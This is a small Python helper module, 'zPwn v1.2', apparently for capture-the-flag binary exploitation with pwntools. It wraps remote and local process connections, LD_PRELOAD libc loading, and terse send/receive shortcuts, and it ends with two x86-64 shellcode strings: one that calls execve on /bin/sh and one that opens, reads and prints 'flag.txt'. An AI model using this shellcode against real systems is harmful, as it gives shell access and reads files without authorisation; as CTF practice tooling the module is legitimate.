
#zPwn v1.2
#Update context.terminal,ld binary libc

from pwn import *

r=''

#connect

def r(REMOTE_INFO:str):
    global r

    REMOTE_IP=REMOTE_INFO.split()[1]
    REMOTE_PORT=int(REMOTE_INFO.split()[2])
    r=remote(REMOTE_IP,REMOTE_PORT)

def p(REMOTE_INFO:str):
    global r
    r=process(REMOTE_INFO)

def libcp(ld:str,process_info:str,libc:str):
    global r

    r = process([ld, process_info], env={"LD_PRELOAD":libc})    

#shorten function

def terminal(): context.terminal = ['tmux', 'new-window']
def arch(arc:str): context.arch=f'{arc}'
def debug(): context.log_level='DEBUG'
def gdbat(): return gdb.attach(r)

#shorten common command 

def s(payload): return r.send(payload)
def sl(payload): return r.sendline(payload)
def sla(after, payload): return r.sendlineafter(after, payload)
def sa(after, payload): return r.sendafter(after, payload)
def rc(num): return r.recv(num)
def rcl(): return r.recvline()
def rcls(num): return r.recvlines(num)
def rcu(payload): return r.recvuntil(payload)
def ita(): return r.interactive()
def cl(): return r.close()


#shells

class shells:
    
    def __init__(self):
        self=self

    def sh():
        return  '''
            xor rbx,rbx 
            mov rbx, 0x68732f6e69622f 
            push rbx 
            mov rdi,rsp 
            mov rax,0x3b 
            xor rsi,rsi 
            xor rdx, rdx 
            syscall
            // /bin/sh

            '''

    def orw():
        return '''
    mov rax, 0x7478742e67616c66
    push rax
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 2
    syscall
    // open( "flag.txt" , 0 , 0 )

    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x50
    mov rax, 0
    syscall
    // read( fd , rsp , 0x50 )

    mov rdi, 1
    mov rax, 1
    syscall
    // write( 1 , rsp , 0x50 )

    ''' 
